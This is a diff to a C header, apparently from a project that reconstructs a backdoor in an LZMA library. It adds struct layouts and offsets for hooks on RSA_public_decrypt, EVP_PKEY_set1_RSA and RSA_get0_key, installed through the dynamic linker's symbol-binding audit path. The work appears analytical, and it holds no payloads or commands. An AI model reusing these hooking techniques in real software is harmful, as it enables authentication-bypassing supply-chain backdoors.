@@ -489,6 +489,7 @@ typedef struct __attribute__((packed)) {
 	int *(*__errno_location)(void);
 	int (*setlogmask)(int mask);
 	int (*shutdown)(int sockfd, int how);
+	void **libc_stack_end;
 } libc_imports_t;
 
 assert_offset(libc_imports_t, resolved_imports_count, 0);
@@ -504,6 +505,7 @@ assert_offset(libc_imports_t, read, 0x48);
 assert_offset(libc_imports_t, __errno_location, 0x50);
 assert_offset(libc_imports_t, setlogmask, 0x58);
 assert_offset(libc_imports_t, shutdown, 0x60);
+static_assert(sizeof(libc_imports_t) == 0x70);
 
 typedef int (*pfn_RSA_public_decrypt_t)(
 	int flen, unsigned char *from, unsigned char *to,
@@ -573,7 +575,7 @@ typedef struct __attribute__((packed)) {
 	void (*RSA_free)(RSA *rsa);
 	void (*BN_free)(BIGNUM *a);
 	libc_imports_t *libc;
-	u32 resolved_imports_count;
+	u64 resolved_imports_count;
 } imported_funcs_t;
 
 assert_offset(imported_funcs_t, RSA_public_decrypt, 0);
@@ -670,9 +672,74 @@ typedef struct __attribute__((packed)) {
 assert_offset(backdoor_shared_globals_t, globals, 0x10);
 
 typedef struct __attribute__((packed)) {
+	PADDING(0x70);
+	PADDING(sizeof(void *));
+	PADDING(sizeof(u64));
+	PADDING(0x78);
+	PADDING(sizeof(u64));
+	void *dl_audit_symbind_alt;
+	u64 dl_audit_symbind_alt__size;
+	typeof(&RSA_public_decrypt) hook_RSA_public_decrypt;
+	typeof(&EVP_PKEY_set1_RSA) hook_EVP_PKEY_set1_RSA;
+	typeof(&RSA_get0_key) hook_RSA_get0_key;
+	imported_funcs_t *imports;
+	u64 hooks_installed;
+} ldso_ctx_t;
+
+assert_offset(ldso_ctx_t, dl_audit_symbind_alt, 0x100);
+assert_offset(ldso_ctx_t, dl_audit_symbind_alt__size, 0x108);
+assert_offset(ldso_ctx_t, hook_RSA_public_decrypt, 0x110);
+assert_offset(ldso_ctx_t, hook_EVP_PKEY_set1_RSA, 0x118);
+assert_offset(ldso_ctx_t, hook_RSA_get0_key, 0x120);
+static_assert(sizeof(ldso_ctx_t) == 0x138);
+
+
+typedef struct __attribute__((packed)) {
+	ldso_ctx_t ldso_ctx;
+	global_context_t global_ctx;
+	imported_funcs_t imported_funcs;
+	PADDING(0xE0);
+	libc_imports_t libc_imports;
+	PADDING(0x70);
+} backdoor_hooks_data_t;
+
+assert_offset(backdoor_hooks_data_t, ldso_ctx, 0);
+assert_offset(backdoor_hooks_data_t, global_ctx, 0x138);
+assert_offset(backdoor_hooks_data_t, imported_funcs, 0x2A0);
+assert_offset(backdoor_hooks_data_t, libc_imports, 0x4A8);
+static_assert(sizeof(backdoor_hooks_data_t) == 0x588);
+
+typedef struct __attribute__((packed)) {
+	PADDING(0x30);
+	backdoor_shared_globals_t *shared;
+	backdoor_hooks_data_t **hooks_data_addr;
+	uintptr_t (*symbind64)(
+		Elf64_Sym *sym, unsigned int ndx,
+		uptr *refcook, uptr *defcook,
+		unsigned int flags, const char *symname);
+	typeof(&RSA_public_decrypt) hook_RSA_public_decrypt;
+	typeof(&RSA_get0_key) hook_RSA_get0_key;
+	PADDING(sizeof(void *));
+	PADDING(sizeof(void *));
+	PADDING(sizeof(void *));
+	PADDING(sizeof(void *));
+	PADDING(sizeof(void *));
+	PADDING(sizeof(void *));
+} backdoor_hooks_ctx_t;
+
+assert_offset(backdoor_hooks_ctx_t, shared, 0x30);
+assert_offset(backdoor_hooks_ctx_t, hooks_data_addr, 0x38);
+assert_offset(backdoor_hooks_ctx_t, symbind64, 0x40);
+assert_offset(backdoor_hooks_ctx_t, hook_RSA_public_decrypt, 0x48);
+assert_offset(backdoor_hooks_ctx_t, hook_RSA_get0_key, 0x50);
+
+static_assert(sizeof(backdoor_hooks_ctx_t) == 0x88);
+
+
+typedef struct __attribute__((packed)) {
 	PADDING(0x8);
 	backdoor_shared_globals_t *shared;
-	void *hook_functions;
+	backdoor_hooks_ctx_t *hook_params;
 	PADDING(0x68);
 	elf_entry_ctx_t *entry_ctx;
 } backdoor_setup_params_t;
@@ -765,7 +832,7 @@ typedef struct __attribute__((packed)) backdoor_data {
 	 */
 	libc_imports_t libc_imports;
 
-	PADDING(0x380);
+	PADDING(0x378);
 	/**
 	 * @brief ELF import resolver (fake LZMA allocator)
 	 */
@@ -1137,7 +1204,7 @@ extern void elf_find_string_references(elf_info_t *elf_info, string_references_t
  * @param sym_version optional string representing the symbol version (e.g. "GLIBC_2.2.5")
  * @return Elf64_Sym* pointer to the ELF symbol, or NULL if not found
  */
-extern Elf64_Sym *elf_symbol_get(elf_info_t *elf_info, EncodedStringId encoded_string_id, const char *sym_version);
+extern Elf64_Sym *elf_symbol_get(elf_info_t *elf_info, EncodedStringId encoded_string_id, EncodedStringId sym_version);
 
 /**
  * @brief Looks up an ELF symbol from a parsed ELF, and returns its memory address
@@ -1448,7 +1515,7 @@ extern BOOL _get_cpuid(int cpuid_request, void*, void*, void*, void*, void*);
  * @param funcs 
  * @return int 
  */
-extern int init_hook_functions(void *funcs);
+extern int init_hook_functions(backdoor_hooks_ctx_t *funcs);
 
 /**
  * @brief recomputes the GOT address
@@ -1478,6 +1545,7 @@ extern uintptr_t backdoor_symbind64(
 extern u32 resolver_call_count;
 extern global_context_t *global_ctx;
 extern lzma_allocator *fake_lzma_allocator;
+extern backdoor_hooks_data_t **hooks_data_addr;
 
 #include "util.h"
 #endif
